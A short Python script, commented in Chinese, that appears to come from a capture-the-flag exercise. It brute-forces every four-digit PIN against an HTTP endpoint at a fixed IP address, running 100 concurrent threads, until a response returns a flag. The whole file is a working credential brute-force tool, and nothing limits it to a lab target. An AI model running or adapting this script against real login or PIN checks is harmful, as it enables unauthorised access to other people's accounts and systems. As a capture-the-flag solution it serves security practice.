import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

url = 'http://94.237.54.190:56943/pin'

# 全局状态控制
found_flag = threading.Event()
result = None
result_lock = threading.Lock()
print_lock = threading.Lock()  # 防止打印混乱

def test_pin(pin):
    global result

    # 提前终止检查
    if found_flag.is_set():
        return None

    formatted_pin = f"{pin:04}"
    
    # 控制台输出（可选，可能影响性能）
    with print_lock:
        print(f"\rTrying pin: {formatted_pin}", end="", flush=True)

    try:
        # 发送HTTP请求（添加超时参数）
        response = requests.get(
            url,
            params={"pin": formatted_pin},
            timeout=3  # 适当调整超时时间
        )
        
        if response.status_code == 200:
            data = response.json()  # 修正这里应该是方法调用
            if "flag" in data:
                with result_lock:
                    if not found_flag.is_set():
                        found_flag.set()
                        result = (formatted_pin, data["flag"])
                        return formatted_pin
    except Exception as e:
        # 可在此处添加错误处理逻辑
        pass
    
    return None

def main():
    with ThreadPoolExecutor(max_workers=100) as executor:  # 根据实际情况调整并发数
        # 生成所有可能的PIN（0000-9999）
        futures = {executor.submit(test_pin, pin) for pin in range(10000)}
        
        # 优先处理最先完成的任务
        for future in as_completed(futures):
            if found_flag.is_set():
                # 取消所有未完成的任务
                for f in futures:
                    f.cancel()
                break

    # 输出最终结果
    if found_flag.is_set():
        print(f"\n\nSuccess! PIN: {result[0]}")
        print(f"Flag: {result[1]}")
    else:
        print("\nFailed to find the correct PIN.")

if __name__ == "__main__":
    main()
